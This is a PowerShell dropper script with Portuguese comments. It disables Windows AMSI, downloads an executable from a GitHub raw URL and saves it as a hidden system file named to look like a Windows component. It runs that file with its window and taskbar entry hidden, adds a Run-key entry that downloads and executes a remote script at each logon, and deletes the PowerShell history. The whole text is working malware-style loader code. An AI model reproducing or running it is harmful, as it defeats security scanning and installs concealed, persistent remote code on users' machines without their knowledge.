# Bypass do AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$url = "https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/koxmenu.exe"
$hidePath = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $hidePath)

    # Esconde o arquivo no disco
    $fileInfo = Get-Item $hidePath
    $fileInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

    # Código C# para rodar E esconder a janela do processo
    $code = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

public class GhostProcess {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    // APIs para manipular a janela do Windows e esconder o processo
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    [DllImport("user32.dll")]
    static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    public static void Run(string path) {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0; 
        
        uint flags = 0x08000000 | 0x00000008 | 0x00000200; // CREATE_NO_WINDOW | DETACHED_PROCESS
        PROCESS_INFORMATION pi;
        
        CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, null, ref si, out pi);

        // Espera 500ms para o programa abrir a janela dele
        Thread.Sleep(500); 

        try {
            Process p = Process.GetProcessById(pi.dwProcessId);
            IntPtr hWnd = p.MainWindowHandle;
            
            if (hWnd != IntPtr.Zero) {
                // 1. SW_HIDE (0) - Esconde a janela completamente
                ShowWindow(hWnd, 0); 
                
                // 2. Tira o ícone da barra de tarefas e do Alt+Tab
                int WS_EX_TOOLWINDOW = 0x00000080;
                int WS_EX_APPWINDOW = 0x00040000;
                int GWL_EXSTYLE = -20;
                
                int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
                exStyle = (exStyle | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW;
                SetWindowLong(hWnd, GWL_EXSTYLE, exStyle);
            }
        } catch {
            // Se o processo fechar rápido, ignora
        }
    }
}
"@
    Add-Type -TypeDefinition $code -Language CSharp
    
    # Roda o cheat e aplica o bypass de janela
    [GhostProcess]::Run($hidePath)

    # Persistência
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/sync.ps1')`""
    Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value $cmd

    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
} catch {}
